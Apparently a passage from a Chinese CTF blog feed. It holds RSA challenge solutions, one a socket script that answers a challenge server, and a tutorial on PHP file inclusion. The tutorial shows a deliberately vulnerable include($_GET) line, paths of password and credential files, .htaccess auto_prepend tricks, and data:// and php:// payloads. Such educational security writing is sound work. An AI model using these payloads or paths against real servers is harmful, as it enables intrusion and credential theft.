class="line"></span><br><span class="line">p = <span class="number">1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213</span></span><br><span class="line">q = <span class="number">1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m=pow(c,d,N)</span><br><span class="line"><span class="keyword">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="Twinning"><a href="#Twinning" class="headerlink" title="Twinning"></a>Twinning</h3><p>进入题目,nc jh2i.com 50013</p><p>得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Generating public and private key...</span><br><span class="line"></span><br><span class="line">Public Key in the format (e,n) is: (65537,28795374863)</span><br><span class="line">The Encrypted PIN is 28156503395</span><br><span class="line">What is the PIN?</span><br></pre></td></tr></table></figure><p>看见(e,n)推测是RSA.pin因该就是密文.我们要提交明文得到flag.</p><p>当我按照再次思路,yafu分解然后用Ooo-la-la提到rsa解密后提交答案是发现连接断开了.</p><p>看来得用全脚本来RSA.这时，有个问题出现了，怎么用python来分解N。</p><p>经过反复的nc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(e,n) is: (65537,28795374863) # 28795374863 &#x3D; 169691 · 169693 </span><br><span class="line">(e,n) is: (65537,1063946864483) #1063946864483 &#x3D; 1031477 · 1031479</span><br><span class="line">(e,n) is: (65537,4953152922623) #4953152922623 &#x3D; 2225567 · 2225569</span><br></pre></td></tr></table></figure><p>发现n的值偏小，且分解出来的质数相近。</p><p>且p与q相差2</p><p>所以可以立一元二次方程 0 =p**2+2p-n</p><p>利用根为正数的求根公式得：</p><p><img src="image-20200618112429889.png" alt="image-20200618112429889"></p><p>所以可以写代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Mon Jun 13 22:01:50 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: 冰之幻魄</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n)</span>:</span></span><br><span class="line">  n2=pow(n,<span class="number">0.5</span>)</span><br><span class="line">  m=pow((pow(int(n2+<span class="number">1</span>),<span class="number">2</span>)-n),<span class="number">0.5</span>)</span><br><span class="line">  <span class="keyword">return</span> [int(int(n2)-m+<span class="number">1</span>),int(int(n2)+m+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">s = socket.socket()   </span><br><span class="line"><span class="comment">#nc jh2i.com 50013</span></span><br><span class="line">HOST = <span class="string">'jh2i.com'</span>  <span class="comment"># 服务器的主机名或者 IP 地址</span></span><br><span class="line">PORT =  <span class="number">50013</span>      <span class="comment"># 服务器使用的端口</span></span><br><span class="line"></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">x=s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">y=str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z=str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line">e,n=re.findall(<span class="string">r"\d+\.?\d*"</span>,y)</span><br><span class="line">pin=re.findall(<span class="string">r"\d+\.?\d*"</span>,z)</span><br><span class="line"></span><br><span class="line">pin=int(pin[<span class="number">0</span>])</span><br><span class="line">e=int(e)</span><br><span class="line">n=int(n)</span><br><span class="line">print(pin,e,n)  <span class="comment">#9543182834506 65537 11828096639999</span></span><br><span class="line">p,q=getpq(n)</span><br><span class="line">print(p,q)</span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))%((p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m=pow(pin,d,n)</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line">s.send(str(m).encode())</span><br><span class="line">print(str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>))</span><br><span class="line">print(str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h3 id="Raspberry"><a href="#Raspberry" class="headerlink" title="Raspberry"></a>Raspberry</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681</span><br></pre></td></tr></table></figure><p>拿到题目分析发现 n、e、c，猜测是rsa解密。</p><p>分解N，发现分解出多个质数，但质数的数量刚好为整数：</p><p><img src="image-20200616112333257.png" alt="image-20200616112333257"></p><p>按常规RSA的常规实现中 n=p*q（p、q均为质数)只有两个质数组成。</p><p><strong>但根据rsa原理与数论知识，如果n可以分解为多个素数的乘积。可看成是RSA算法的推广形式。</strong><br>         例如：若<code>n=p‘*q*s*t,则r=(p-1)*(q-1)*(s-1)*(t-1),d=e^-1 mod r。</code></p><p>同理写成脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x=<span class="string">b''</span></span><br><span class="line">y=[</span><br><span class="line">(<span class="number">2208664111</span>,<span class="number">3290718047</span>),</span><br><span class="line">(<span class="number">2982067987</span>,<span class="number">2214452749</span>),</span><br><span class="line">(<span class="number">2465499073</span>,<span class="number">2589229021</span>),</span><br><span class="line">(<span class="number">3644712913</span>,<span class="number">3600488797</span>),</span><br><span class="line">(<span class="number">4205130337</span>,<span class="number">3130932919</span>),</span><br><span class="line">(<span class="number">4268160257</span>,<span class="number">3726115171</span>),</span><br><span class="line">(<span class="number">3510442297</span>,<span class="number">3789130951</span>),</span><br><span class="line">(<span class="number">2758626487</span>,<span class="number">2543358889</span>),</span><br><span class="line">(<span class="number">3650456981</span>,<span class="number">4221911101</span>),</span><br><span class="line">(<span class="number">2642723827</span>,<span class="number">2947867051</span>),</span><br><span class="line">(<span class="number">3810149963</span>,<span class="number">2850808189</span>),</span><br><span class="line">(<span class="number">4033877203</span>,<span class="number">3750978137</span>)]</span><br><span class="line"></span><br><span class="line">c=<span class="number">5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681</span></span><br><span class="line">n=<span class="number">1</span></span><br><span class="line">k=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> y:</span><br><span class="line">    e=<span class="number">65537</span>      </span><br><span class="line">    q=i[<span class="number">1</span>]</span><br><span class="line">    p=i[<span class="number">0</span>]</span><br><span class="line">    n=p*q*n</span><br><span class="line">    k=k*(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">  </span><br><span class="line">d=gmpy2.invert(e,k)%(k)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print( long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得flag：</p><p><img src="image-20200616113311011.png" alt="image-20200616113311011"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/wangqing84411433/article/details/89600335" target="_blank" rel="noopener">常见User-Agent</a></p><p><a href="https://lexsd6.github.io/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">文件包含漏洞的知识梳理</a></p><p><a href="https://zhuanlan.zhihu.com/p/107300262" target="_blank" rel="noopener">质数的几种判断方法</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于文件包含漏洞的知识梳理</title>
      <link href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
      <url>/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>近日刷题发现对基础知识掌握有点不牢固,故逐步整理温习.今天还是先整理下文件包含漏洞.</p><p>文件包含是指:程序开发人员把经常使用代码写到一个文件里,在使用时直接调用那个文件而无需重新编写代码的过程称为文件包含.在c语言中的调用头文件和python import调用模块本质上就是一种文件包含。而文件包含漏洞（RFI）是指通过函数包含文件时，没有对包含的文件进行处理导致包含某些敏感文件或恶意文件。</p><a id="more"></a><h2 id="0x01文件包含漏洞的存在点"><a href="#0x01文件包含漏洞的存在点" class="headerlink" title="0x01文件包含漏洞的存在点"></a>0x01文件包含漏洞的存在点</h2><p>文件包含漏洞一般出现在文件系统函数的地方。比如include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file等文件系统函数。其中include、require、include_once、require_once四个函数在包含一个文件时，会执行里面的有php标记的代码。</p><p>最简单的，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lexs'</span>]);<span class="comment">#可以控制lexs的参数内容来达到目的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02远程文件包含"><a href="#0x02远程文件包含" class="headerlink" title="0x02远程文件包含"></a>0x02远程文件包含</h2><p>当PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include等包含函数可以加载远程文件。通常是被恶意人士用来远程包含一个恶意脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On (允许打开URL文件,预设启用)</span><br><span class="line">allow_url_fopen &#x3D; Off (禁止打开URL文件)</span><br><span class="line">allow_url_include &#x3D; Off (禁止引用URL文件,新版增加功能,预设关闭)</span><br><span class="line">allow_url_include &#x3D; On (允许引用URL文件,新版增加功能)</span><br></pre></td></tr></table></figure><p><img src="image-20200605165003940.png" alt="image-20200605165003940"></p><h2 id="0x03本地文件包含"><a href="#0x03本地文件包含" class="headerlink" title="0x03本地文件包含"></a>0x03本地文件包含</h2><p>本地文件包含指包含服务器上的文件。这个方法来用来读取服务器上某些文件的敏感信息或包含执行上传的恶意脚本。</p><h3 id="（1）利用目录遍历漏洞来进行文件包含"><a href="#（1）利用目录遍历漏洞来进行文件包含" class="headerlink" title="（1）利用目录遍历漏洞来进行文件包含"></a>（1）利用目录遍历漏洞来进行文件包含</h3><p>目录遍历漏洞按我理解就是通过相对路径的方式访问文件.(通过url地址中’../‘ 表上一级目录’./‘表当前目录’/‘表下一级目录).例：访问zhuce.php的上级目录下的flag.php.</p><p><img src="image-20200605212506017.png" alt="image-20200605212506017"></p><p>但要注意php配置中的include_path与open_basedir的配置：</p><h4 id="1-include-path"><a href="#1-include-path" class="headerlink" title="1.include_path"></a>1.include_path</h4><p>当寻找要包含的文件时，PHP会分别考虑包含路径中的每个条目。它将检查第一个路径，如果找不到，请检查下一个路径，直到找到包含的文件或返回警告 或错误为止 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; UNIX: &quot;&#x2F;path1:&#x2F;path2&quot;</span><br><span class="line">include_path &#x3D; &quot;.:&#x2F;php&#x2F;includes&quot;</span><br><span class="line">;在UNIX，下在包含时先找当前目录下面的文件，如果找不到找&#x2F;php&#x2F;includes目录下的文件，若再找不到则报错。</span><br><span class="line">; Windows: &quot;\path1;\path2&quot;</span><br><span class="line">include_path &#x3D; &quot;.;c:\php\includes&quot;</span><br><span class="line">;在Windows，下在包含时先找当前目录下面的文件，如果找不到找c:\php\includes目录下的文件，若再找不到则报错。</span><br></pre></td></tr></table></figure><h4 id="2-open-basedir"><a href="#2-open-basedir" class="headerlink" title="2.open_basedir"></a>2.open_basedir</h4><p>将PHP可以访问的文件限制为指定的目录树，包括文件本身。这个指令是不是由安全模式打开或者关闭的影响。在open_basedir为配置时可以用任意遍历目录但有了open_basedir的设置就能够包含设置下的目录。</p><p><img src="image-20200605221901168.png" alt="image-20200605221901168"></p><p><img src="image-20200605221707515.png" alt="image-20200605221707515"></p><h3 id="（2）利用绝对路径来进行文件包含"><a href="#（2）利用绝对路径来进行文件包含" class="headerlink" title="（2）利用绝对路径来进行文件包含"></a>（2）利用绝对路径来进行文件包含</h3><p>我们可以通过绝对路径来进行文件包含：</p><p><img src="image-20200605223232782.png" alt="image-20200605223232782"></p><p>但用绝对路径然而受到open_basedir的限制：</p><p><img src="image-20200605221551100.png" alt="image-20200605221551100"></p><p>常见的敏感信息的默认绝对路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Windows系统：</span><br><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br><span class="line"></span><br><span class="line">Linux&#x2F;Unix系统：</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure><h3 id="（3）利用日志文件机制来进行文件包含"><a href="#（3）利用日志文件机制来进行文件包含" class="headerlink" title="（3）利用日志文件机制来进行文件包含"></a>（3）利用日志文件机制来进行文件包含</h3><p>因为服务器日志用记录下我们访问信息与发送的数据.</p><p>利用日志文件机制这个机制通过报错将报错的信息写入日志,再通过文件包含包含日志.</p><p><img src="image-20200606151047308.png" alt="image-20200606151047308"></p><h3 id="（4）利用-htaccess来进行文件包含"><a href="#（4）利用-htaccess来进行文件包含" class="headerlink" title="（4）利用 .htaccess来进行文件包含"></a>（4）利用 .htaccess来进行文件包含</h3><p>php.ini中auto_prepend_file和auto_append_file分别可以在作用范围内的php文件在文件头/尾自动include指定文件并且可以支持php伪协议.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line">auto_append_file  在页面底部加载文件</span><br></pre></td></tr></table></figure><p>注意：auto_prepend_file 与 auto_append_file 只能包含一个php文件，但这个php文件内可以包含多个其他的php文件。</p><p>在 .htaccess文件中php_value 可以设置php.ini里的选项,并只在 .htaccess文件所在的文件夹下生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file  lexsd6.php</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64decode&#x2F;resource&#x3D;lexsd6.php&quot;</span><br></pre></td></tr></table></figure><p>故可以把代码入.htaccess文件中，再通过auto_prepend_file/auto_append_file包含。即：</p><p><img src="image-20200612215358056.png" alt="image-20200612215358056"></p><p>同时不仅可以通过.htaccess文件来改变open_basedir来让包含路径不受限制，还可以通过与include_path来改变包含路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value open_basedir   xxx1(允许的路径)</span><br><span class="line">php_value include_path   xxx2(包含路径)</span><br></pre></td></tr></table></figure><h2 id="0x04利用php协议进行包含"><a href="#0x04利用php协议进行包含" class="headerlink" title="0x04利用php协议进行包含"></a>0x04利用php协议进行包含</h2><p>在文件包含时可以通过php协议,来绕过一些限制从而进行包含.</p><p>PHP中支持的伪协议:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">*php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">*zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">*data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure><p>大佬总结的图如下:</p><p><img src="image-20200606151558443.png" alt="image-20200606151558443"></p><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响.</p><p>用法: file:// [文件的绝对路径和文件名]</p><p>例： file://C:/phpstudy_pro/WWW/flag.php</p><h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h4><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><p>(1)php://filter</p><p> php://filter与file://协议相似在双off的情况下也可以正常使用.</p><p>用法: php://filter/筛选过滤方式/resource=&lt;文件&gt;</p><p>例:php://filter/read=convert.base64-encode/resource=index.php</p><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><p>(2)php://input</p><p>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。<br>ps：enctype=”multipart/form-data” 或allow_url_include=off 的时候 php://input 是无效的。</p><p>用法：php://input  (post 方式提交php代码)</p><h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><p>又称为RFC 2397 协议,data://协议在‘allow_url_fopen =on ’与v‘allow_url_include：on’<br>且php 版本大于等于 php5.2 才能生效。</p><p>用法 data://资源类型;编码,内容  （‘data://’也可以写成‘data:’）</p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><h2 id="0x00参考资料"><a href="#0x00参考资料" class="headerlink" title="0x00参考资料"></a>0x00参考资料</h2><p><a href="https://www.php.net/manual/zh/ini.core.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.core.php</a></p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于php反序列化字符逃逸的思考</title>
      <link href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>php反序列化字符逃逸：指序列化的字符串是受某函数的所谓过滤处理后，字符串的某一部分会变化但描述其长度的数字没有改变.导致PHP在按该数字读取相应长度字符串后，本来属于该字符串的内容逃逸出了成为反序列化的一个属性,并成功反序列化.</p><a id="more"></a><h3 id="0x01逃逸产生的原因"><a href="#0x01逃逸产生的原因" class="headerlink" title="0x01逃逸产生的原因"></a>0x01逃逸产生的原因</h3><p>1.PHP在类进行序列化时，对类中不存在的属性也会进行反序列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class c&#123;</span><br><span class="line">    public $c&#x3D;&#39;ccc&#39;;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;new C;</span><br><span class="line">echo serialize($a);&#x2F;&#x2F;输出  O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;</span><br><span class="line"></span><br><span class="line">print_r(unserialize(&#39;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;&#125;&#39;));</span><br><span class="line">&#x2F;&#x2F;输出  C Object ( [c] &#x3D;&gt; C Object ( [c] &#x3D;&gt; ccc ) )</span><br><span class="line">print_r(unserialize(&#39;O:1:&quot;C&quot;:2:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;&#125;&#39;));</span><br><span class="line">&#x2F;&#x2F;输出C </span><br><span class="line">&#x2F;&#x2F;Object ( [c] &#x3D;&gt; ccc [b] &#x3D;&gt; C Object ( [c] &#x3D;&gt; 